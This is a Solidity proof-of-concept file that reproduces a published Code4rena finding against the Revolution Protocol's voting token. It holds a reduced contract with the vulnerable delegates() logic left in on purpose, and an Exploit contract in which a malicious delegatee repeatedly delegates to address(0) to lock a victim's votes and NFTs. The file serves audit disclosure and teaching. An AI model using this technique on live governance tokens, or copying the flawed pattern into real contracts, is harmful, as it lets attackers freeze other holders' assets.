// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*//////////////////////////////////////////////////////////////////////////
    Collective (Revolution Protocol) — Malicious delegatees can block
    delegators from redelegating and from sending their NFTs
    (Code4rena 2023-12-revolutionprotocol, finding #30091, H-04, 0xDING99YA)

    SYNTHETIC, CHEATCODE-FREE reduction for the EVM Playground. VotesUpgradeable's
    `delegates()` convenience change (return `account` instead of address(0) when
    never explicitly delegated) combines with `_moveDelegateVotes` to let a
    delegatee repeatedly call `delegate(address(0))` and drain (or underflow) the
    checkpoint that also holds a delegator's votes. The Exploit deploys a
    minimal Votes/ERC721Checkpointable token, has a user delegate to an
    attacker, has the attacker call delegate(address(0)) twice, and shows the
    user is then PERMANENTLY blocked from redelegating AND from transferring
    their own NFTs (no fork, no cheatcodes).
//////////////////////////////////////////////////////////////////////////*/

/*//////////////////////////////////////////////////////////////
    Root cause: VotesUpgradeable.delegates() (base/VotesUpgradeable.sol:L166)
    was changed from OpenZeppelin's original (`return $._delegatee[account];`)
    to a "convenience" version that returns `account` itself instead of
    address(0) when the account has never explicitly delegated:

        function delegates(address account) public view virtual returns (address) {
            return $._delegatee[account] == address(0) ? account : $._delegatee[account];
        }

    `_delegate(account, delegatee)` (used by both delegate() and the ERC-721
    transfer hook) calls `_moveDelegateVotes(delegates(account), delegatee, units)`.
    In the ORIGINAL OpenZeppelin implementation, once an account's delegatee is
    address(0), `delegates()` keeps returning address(0), so `_moveDelegateVotes`
    correctly no-ops the `from` side on every subsequent no-op delegation.

    Here, once `_delegatee[account] == address(0)`, `delegates(account)` returns
    `account` itself EVERY time — so calling `delegate(address(0))` repeatedly
    keeps resolving `oldDelegate = account` and keeps subtracting `account`'s own
    voting units from `_delegateVotes[account]` on EVERY call, even though
    nothing about the account's own balance changed. If someone else has
    delegated TO that account, their votes live in the SAME checkpoint slot —
    so repeated no-op self-delegate-to-zero calls drain (and can underflow) the
    combined checkpoint, permanently blocking the original delegator from
    redelegating or transferring their tokens (underflow reverts).

    Recommended fix (per the report, adopted by the protocol): do not allow
    delegating to address(0).
//////////////////////////////////////////////////////////////*/

/// @notice Reduced Votes base — faithful reduction of
///         base/VotesUpgradeable.sol (Revolution Protocol). Checkpoints are
///         simplified to a single "current votes" value per account (no
///         historical snapshot array) — irrelevant to this bug.
abstract contract Votes {
    mapping(address => address) internal _delegatee;
    mapping(address => uint256) internal _delegateVotes;

    event DelegateChanged(address indexed delegator, address indexed fromDelegate, address indexed toDelegate);
    event DelegateVotesChanged(address indexed delegate, uint256 previousVotes, uint256 newVotes);

    // ============================================================
    //  Vulnerable delegates() — faithful reduction of
    //  base/VotesUpgradeable.sol:L166 (Revolution Protocol)
    // ============================================================
    function delegates(address account) public view virtual returns (address) {
        // @> VULN: returns `account` itself (instead of address(0), the original
        // OpenZeppelin behavior) once the account has never explicitly delegated
        // OR has delegated to address(0). VotesUpgradeable.sol:L166.
        // FIX: return $._delegatee[account]; (do not substitute `account`)
        return _delegatee[account] == address(0) ? account : _delegatee[account];
    }

    function getVotes(address account) public view returns (uint256) {
        return _delegateVotes[account];
    }

    function _getVotingUnits(address account) internal view virtual returns (uint256);

    // ============================================================
    //  _delegate() — faithful reduction of base/VotesUpgradeable.sol
    //  (Revolution Protocol)
    // ============================================================
    function _delegate(address account, address delegatee) internal virtual {
        address oldDelegate = delegates(account);
        _delegatee[account] = delegatee;
        emit DelegateChanged(account, oldDelegate, delegatee);
        _moveDelegateVotes(oldDelegate, delegatee, _getVotingUnits(account));
    }

    // ============================================================
    //  Vulnerable _moveDelegateVotes() — faithful reduction of
    //  base/VotesUpgradeable.sol:L235-244 (Revolution Protocol)
    // ============================================================
    function _moveDelegateVotes(address from, address to, uint256 amount) private {
        if (from != to && amount > 0) {
            if (from != address(0)) {
                uint256 oldValue = _delegateVotes[from];
                // @> VULN: unconditional subtraction. Safe ONLY if repeated no-op
                // delegations by the SAME account can never resolve `from` back to
                // that account more than once — which delegates() above violates.
                // VotesUpgradeable.sol:L239 (via _push/_subtract in the real code).
                _delegateVotes[from] = oldValue - amount;
                emit DelegateVotesChanged(from, oldValue, _delegateVotes[from]);
            }
            if (to != address(0)) {
                uint256 oldValue = _delegateVotes[to];
                _delegateVotes[to] = oldValue + amount;
                emit DelegateVotesChanged(to, oldValue, _delegateVotes[to]);
            }
        }
    }

    /// @dev Faithful reduction of VotesUpgradeable._transferVotingUnits, used by
    ///      the ERC-721 mint/transfer hook below.
    function _transferVotingUnits(address from, address to, uint256 amount) internal {
        if (from != to && amount > 0) {
            _moveDelegateVotes(delegates(from), delegates(to), amount);
        }
    }

    function delegate(address delegatee) external {
        _delegate(msg.sender, delegatee);
    }
}

/// @notice Reduced ERC721CheckpointableUpgradeable — an ERC-721-like voting
///         token whose transfer hook moves delegated votes. Faithful
///         reduction of base/ERC721CheckpointableUpgradeable.sol:L41
///         (Revolution Protocol / VerbsToken).
contract ERC721Checkpointable is Votes {
    mapping(uint256 => address) public ownerOf;
    mapping(address => uint256) public balanceOf;
    uint256 public nextTokenId;

    function _getVotingUnits(address account) internal view override returns (uint256) {
        return balanceOf[account];
    }

    function mint(address to) external returns (uint256 tokenId) {
        tokenId = nextTokenId++;
        ownerOf[tokenId] = to;
        balanceOf[to] += 1;
        _transferVotingUnits(address(0), to, 1);
    }

    /// @dev Simplified: no approvals — only the current owner may transfer
    ///      (irrelevant to this bug; the real contract supports operators too).
    function transferFrom(address from, address to, uint256 tokenId) external {
        require(ownerOf[tokenId] == from, "not owner");
        require(msg.sender == from, "caller not owner");
        ownerOf[tokenId] = to;
        balanceOf[from] -= 1;
        balanceOf[to] += 1;
        // ERC721CheckpointableUpgradeable.sol:L41 — moves delegated votes on transfer.
        _transferVotingUnits(from, to, 1);
    }
}

/// @dev Helper so `user` and `attacker` are each a distinct msg.sender —
///      cheatcode-free stand-in for vm.prank.
contract Actor {
    function doDelegate(Votes token, address to) external {
        token.delegate(to);
    }

    function doTransfer(ERC721Checkpointable token, address to, uint256 tokenId) external {
        token.transferFrom(address(this), to, tokenId);
    }
}

/// @notice Attacker orchestrator. Deploys the token, mints 2 NFTs to a
///         victim `user` and 1 NFT to an `attacker`, has the user delegate
///         to the attacker (a normal, expected action), then has the
///         attacker call delegate(address(0)) twice — draining the combined
///         checkpoint and permanently blocking the user from redelegating or
///         transferring their own NFTs. Cheatcode-free.
contract Exploit {
    ERC721Checkpointable public token; // CREATE nonce 1
    Actor public user; // CREATE nonce 2 (the victim delegator)
    Actor public attacker; // CREATE nonce 3 (the malicious delegatee)

    uint256 public tokenUser0;
    uint256 public tokenUser1;
    uint256 public tokenAttacker0;

    constructor() {
        token = new ERC721Checkpointable(); // nonce 1
        user = new Actor(); // nonce 2
        attacker = new Actor(); // nonce 3

        tokenUser0 = token.mint(address(user));
        tokenUser1 = token.mint(address(user));
        tokenAttacker0 = token.mint(address(attacker));
    }

    function run() external {
        // Baseline: user and attacker each control their own voting power.
        require(token.getVotes(address(user)) == 2, "baseline user votes wrong");
        require(token.getVotes(address(attacker)) == 1, "baseline attacker votes wrong");

        // === 1. User delegates their 2 votes to the attacker (normal, expected). ===
        user.doDelegate(token, address(attacker));
        require(token.getVotes(address(attacker)) == 3, "attacker should hold combined votes");
        require(token.getVotes(address(user)) == 0, "user should hold 0 after delegating away");

        // === 2/3. Attacker calls delegate(address(0)) TWICE in a row. Each call
        //         resolves oldDelegate back to the attacker itself (VULN) and
        //         subtracts the attacker's own voting unit AGAIN, draining the
        //         combined checkpoint that also holds the user's delegated votes. ===
        attacker.doDelegate(token, address(0));
        attacker.doDelegate(token, address(0));
        require(token.getVotes(address(attacker)) == 1, "checkpoint should be drained to 1");

        // === HARM: the user is now PERMANENTLY blocked from redelegating — the
        //     drained checkpoint (1) is less than the user's own voting units (2)
        //     being subtracted from it, so the subtraction underflows and reverts. ===
        bool redelegateReverted = false;
        try user.doDelegate(token, address(user)) {
            // should not succeed
        } catch {
            redelegateReverted = true;
        }
        require(redelegateReverted, "harm not demonstrated: user could still redelegate");

        // Meanwhile the attacker loses nothing — they can freely move their own
        // NFT away and keep it, having spent only the gas for two delegate(0)
        // calls. This ALSO drains the shared checkpoint from 1 to 0 (moving 1
        // voting unit off it), setting up the user's transfer to underflow next.
        attacker.doTransfer(token, address(0xCAFE), tokenAttacker0);
        require(token.ownerOf(tokenAttacker0) == address(0xCAFE), "attacker transfer should succeed");

        // === HARM: the user is ALSO blocked from transferring their own NFTs —
        //     the transfer hook runs the same underflowing _moveDelegateVotes
        //     (checkpoint is now 0; subtracting the user's 1 transferred unit
        //     underflows). ===
        bool transferReverted = false;
        try user.doTransfer(token, address(0xBEEF), tokenUser0) {
            // should not succeed
        } catch {
            transferReverted = true;
        }
        require(transferReverted, "harm not demonstrated: user could still transfer");
    }
}
